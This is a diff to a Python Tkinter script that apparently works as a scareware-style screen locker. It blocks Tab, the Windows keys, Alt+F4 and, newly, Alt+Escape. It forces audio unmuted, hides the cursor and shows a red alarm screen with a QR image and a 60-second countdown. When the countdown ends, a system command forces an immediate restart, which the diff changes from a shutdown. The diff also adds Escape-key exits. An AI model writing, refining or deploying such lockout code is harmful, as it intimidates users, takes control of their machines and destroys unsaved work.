@@ -18,6 +18,7 @@ keyboard.block_key('tab')
 keyboard.block_key('left windows')
 keyboard.block_key('right windows')
 keyboard.add_hotkey('alt+f4', lambda: None) 
+keyboard.add_hotkey('alt+escape', lambda: None) 
 def enforce_unmute():
     if volume_control.GetMute() == 1:
         volume_control.SetMute(0, None)
@@ -63,6 +64,7 @@ def on_closing():
     keyboard.unblock_key('left windows')
     keyboard.unblock_key('right windows')
     keyboard.remove_hotkey('alt+f4')
+    keyboard.remove_hotkey('alt+escape')
     root.destroy()
 def gifframes(path):
     frames = []
@@ -90,7 +92,8 @@ def warningui():
 
     left_frame = tk.Frame(root)
     left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)
-    root.bind("<Escape>+<0>", lambda event: exit(event, root))
+    root.bind("<Escape>", lambda event: exit(event, root))
+    root.bind("<Escape><0>", lambda event: exit(event, root))
     right_frame = tk.Frame(root)
     right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)
     alarm_label = tk.Label(left_frame)
@@ -119,9 +122,9 @@ def warningui():
     timer_label = tk.Label(left_frame, text="01:00", font=timer_font)
     timer_label.pack(pady=10, expand=True, anchor="n")
 
-    countdown(60, timer_label)#change timer optionall
+    countdown(60, timer_label)#change timer optional
     try:
-        qr_image = Image.open("qr.jpeg")
+        qr_image = Image.open("qr.png")
         qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
         qr_photo = ImageTk.PhotoImage(qr_image)
         qr_label = tk.Label(right_frame, image=qr_photo)
@@ -134,7 +137,9 @@ def warningui():
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.bind("<Alt-F4>", lambda e: "break") 
     root.bind("<F1>", lambda e: "break")
-    root.bind("<Escape><0>", lambda event: on_closing())
+    root.bind("Alt-Escape>", lambda e: "break")
+
+    root.bind("<Escape>", lambda event: on_closing())
     root.mainloop()
 def countdown(time_left, label):
     if time_left >= 0:
@@ -144,7 +149,7 @@ def countdown(time_left, label):
         root.after(1000, countdown, time_left - 1, label)
     else:
         label.config(text="00:00\nSHUTTING DOWN...", fg="white")
-        os.system("shutdown /s /t 0")
+        os.system("shutdown /r /t 0")
 
 
 root.config(bg= "red",cursor="none")
